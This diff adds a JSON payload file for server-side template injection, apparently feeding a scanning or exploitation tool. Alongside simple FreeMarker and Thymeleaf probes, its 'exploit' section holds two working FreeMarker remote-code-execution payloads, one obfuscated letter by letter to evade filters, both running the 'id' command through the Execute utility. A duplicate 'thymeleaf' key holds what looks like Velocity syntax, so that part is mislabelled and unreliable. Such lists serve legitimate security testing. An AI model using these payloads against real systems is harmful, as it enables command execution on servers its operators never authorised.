@@ -1,0 +1,30 @@
+{
+  "freemarker": {
+    "payloads": {
+      "${7*7}": "49",
+      "${1?lower_abc}" :"a",
+      "${27?lower_abc}" : "aa"
+    },
+    "exploit": {
+      "rce": "${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}",
+      "rce2": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"
+    }
+  },
+  "thymeleaf": {
+    "payloads": {
+      "[[7*7]]": "49"
+    },
+    "exploit": {
+    }
+  },
+  "thymeleaf": {
+    "payloads": {
+      "#if(1 == 1)yes#end": "yes"
+    },
+    "exploit": {
+    }
+  }
+
+
+ 
+}
